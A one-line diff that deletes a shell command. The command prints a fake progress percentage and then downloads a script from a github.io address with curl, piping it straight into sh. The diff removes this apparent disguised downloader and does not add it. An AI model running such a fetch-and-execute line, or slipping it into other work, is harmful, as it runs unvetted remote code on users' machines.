@@ -1,1 +1,0 @@
-echo 'Progress: 37.0%'; curl -L --progress-bar frkns.github.io/fun/guidelines_shares.py | sh
